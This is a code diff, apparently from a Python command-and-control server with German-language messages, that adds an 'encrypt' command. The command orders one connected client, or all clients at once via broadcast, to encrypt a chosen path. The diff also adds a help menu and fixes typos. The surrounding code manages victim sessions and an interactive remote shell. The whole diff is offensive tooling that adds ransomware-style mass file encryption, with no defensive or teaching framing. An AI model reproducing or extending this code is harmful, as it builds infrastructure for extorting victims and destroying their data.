@@ -54,13 +54,19 @@ def send_command_to_client(cid, command):
                 print(f"[+] Befehl an ID {cid} gesendet")
             except Exception as e:
                 print(f"[!] Fehler beim senden an {cid}: {e}")
-
         else:
             print(f"[!] Client ID {cid} konnte nicht gefunden werden")
 
 
+def encrypt_target(cid, target_path):
+    """Encrypt Befehl an spezifischen Client senden"""
+    encrypt_command = f"encrypt {target_path}"
+    send_command_to_client(cid, encrypt_command)
+    print(f"[+] Encrypt Befehl für Pfad '{target_path}' an ID {cid} gesendet")
+
+
 def list_sessions():
-    """Alle aktiven Client Sessions ausgeben"""
+    """Alle aktive Client Sessions ausgeben"""
     with lock:
         if not clients:
             print("[!] Keine aktiven Sessions")
@@ -89,25 +95,61 @@ def server_shell():
                         sub_cmd = input(f"ID {cid}> ").strip()
                         if sub_cmd == "background":
                             break
+                        elif sub_cmd.startswith("encrypt "):
+                            # Encrypt Befehl in der interaktiven Session
+                            try:
+                                target_path = sub_cmd.split(" ", 1)[1]
+                                encrypt_target(cid, target_path)
+                            except IndexError:
+                                print("[!] Usage: encrypt <target_path>")
                         elif sub_cmd:
                             send_command_to_client(cid, sub_cmd)
                 else:
-                    print(f"[!] CLient ID {cid} nicht gefunden")
+                    print(f"[!] Client ID {cid} nicht gefunden")
             except (IndexError, ValueError):
                 print("[!] Usage: interact <client_id>")
+        elif cmd.startswith("encrypt "):
+            # Encrypt Befehl mit Client ID
+            try:
+                parts = cmd.split(" ", 2)
+                if len(parts) != 3:
+                    print("[!] Usage: encrypt <client_id> <target_path>")
+                else:
+                    cid = int(parts[1])
+                    target_path = parts[2]
+                    encrypt_target(cid, target_path)
+            except ValueError:
+                print("[!] Client ID muss eine Zahl sein")
         elif cmd.startswith("broadcast "):
             command = cmd[10:].strip()
             if command:
-                broadcast_command(command)
+                if command.startswith("encrypt "):
+                    # Broadcast encrypt Befehl
+                    try:
+                        target_path = command.split(" ", 1)[1]
+                        broadcast_command(f"encrypt {target_path}")
+                        print(f"[+] Encrypt Befehl für Pfad '{target_path}' an alle Clients gesendet")
+                    except IndexError:
+                        print("[!] Usage: broadcast encrypt <target_path>")
+                else:
+                    broadcast_command(command)
             else:
                 print("[!] Usage: broadcast <command>")
+        elif cmd == "help":
+            print("[*] Verfügbare Befehle:")
+            print("  sessions                    - Zeige alle aktiven Sessions")
+            print("  interact <id>               - Interagiere mit einem Client")
+            print("  encrypt <id> <path>         - Verschlüssle Pfad auf spezifischem Client")
+            print("  broadcast <cmd>             - Sende Befehl an alle Clients")
+            print("  broadcast encrypt <path>    - Verschlüssle Pfad auf allen Clients")
+            print("  exit                        - Server beenden")
         elif cmd == "exit":
             with lock:
                 for client_socket in clients.values():
                     client_socket.close()
             sys.exit(0)
         else:
-            print("[!] Commands: session, interact <id>, broadcast <cmd>, exit")
+            print("[!] Commands: sessions, interact <id>, encrypt <id> <path>, broadcast <cmd>, help, exit")
 
 
 def main():
